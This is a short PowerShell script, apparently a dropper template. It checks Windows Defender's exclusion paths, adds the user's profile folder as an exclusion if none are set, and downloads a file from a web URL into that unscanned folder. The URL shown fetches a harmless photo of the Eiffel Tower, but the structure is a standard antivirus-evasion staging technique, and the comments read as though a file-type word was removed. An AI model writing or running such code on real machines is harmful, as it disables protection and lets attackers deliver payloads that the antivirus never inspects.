# Define the default exclusion folder
$defaultExclusionFolder = "C:\users\$($env:USERNAME)"

# Get Windows Defender exclusions
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# Check if there are any exclusions
if ($exclusions.Count -gt 0) {
    # Get the first exclusion folder
    $exclusionFolder = $exclusions[0]
} else {
    # Add the default exclusion folder
    Add-MpPreference -ExclusionPath $defaultExclusionFolder
    $exclusionFolder = $defaultExclusionFolder
    Write-Host "Added $($defaultExclusionFolder) to Windows Defender exclusions."
}

# Define the URL of the  file to download
$fileUrl = "https://www.planetware.com/wpimages/2020/02/france-in-pictures-beautiful-places-to-photograph-eiffel-tower.jpg"

# Define the filename for the downloaded  file
$fileName = "image.jpg"

# Construct the full path to save the downloaded  file in the exclusion folder
$downloadedFilePath = Join-Path -Path $exclusionFolder -ChildPath $fileName

# Download the  file
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($fileUrl, $downloadedFilePath)
    Write-Host "file downloaded from $($fileUrl) and saved to $($downloadedFilePath) successfully."
} catch {
    Write-Host "Failed to download 	file from $($fileUrl). Error: $_"
}
